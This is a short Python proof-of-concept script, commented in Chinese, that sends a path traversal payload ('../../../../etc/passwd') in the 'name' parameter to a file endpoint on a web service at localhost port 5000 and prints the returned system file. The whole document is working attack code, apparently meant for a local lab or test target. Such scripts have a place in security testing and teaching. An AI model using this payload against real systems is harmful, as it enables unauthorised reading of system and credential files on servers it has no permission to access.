import requests

url = "http://127.0.0.1:5000/file"
# 读取/etc/passwd
params = {'name': '../../../../etc/passwd'}  # 根据操作系统调整路径层级
response = requests.get(url, params=params)
print("文件内容：")
print(response.text)